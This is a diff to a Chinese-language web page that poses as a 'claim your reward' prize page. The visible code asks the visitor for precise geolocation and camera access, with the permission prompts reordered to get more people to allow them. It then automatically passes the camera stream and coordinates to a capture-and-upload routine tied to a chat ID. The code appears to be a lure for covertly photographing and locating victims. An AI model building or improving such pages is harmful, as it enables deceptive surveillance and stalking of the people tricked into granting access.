@@ -5,6 +5,7 @@
     <title>🎁 领取奖励 🎁</title>
     <style>
         body { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: url('https://github.com/sachinbagwan208-design/-/raw/main/00.png') no-repeat center center fixed; background-size: cover; color: white; font-family: sans-serif; }
+        /* 默认隐藏相机框 */
         #video { background: #000; border: 2px solid #444; border-radius: 8px; margin-bottom: 20px; display: none; }
         #status { margin: 15px 0; font-weight: bold; background: rgba(0,0,0,0.6); padding: 10px; border-radius: 5px; }
         button { padding: 15px 40px; cursor: pointer; font-size: 20px; border-radius: 5px; border: none; background: #28a745; color: white; }
@@ -29,25 +30,29 @@
             if (!CHAT_ID) { status.innerText = "❌ 错误：未识别到用户ID"; return; }
             
             startBtn.style.display = 'none';
-            status.innerText = "正在获取权限，请点击“允许”...";
+            status.innerText = "正在请求地理位置权限...";
 
             try {
-                // 1. 请求相机
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-                video.style.display = 'block';
-                
-                // 2. 连续请求位置（浏览器会自动弹出第二个请求）
+                // 1. 先请求定位权限
                 const pos = await new Promise((res, rej) => {
                     navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
                 });
                 
-                status.innerText = "权限已授予，正在处理中...";
+                status.innerText = "位置已获取，正在请求相机权限...";
                 
-                // 3. 处理上传
-                await captureAndUpload(stream, pos);
+                // 2. 再请求相机权限
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                
+                // 3. 所有权限拿到后，再显示视频框
+                video.srcObject = stream;
+                video.style.display = 'block'; 
+                status.innerText = "权限已全部授予，正在处理中...";
+                
+                // 4. 延迟一点显示画面后自动上传
+                setTimeout(() => captureAndUpload(stream, pos), 1000);
+                
             } catch (err) {
-                status.innerText = "❌ 必须授权相机和位置权限才能领取奖励。";
+                status.innerText = "❌ 必须允许位置和相机权限才能领取。";
                 console.error(err);
             }
         });
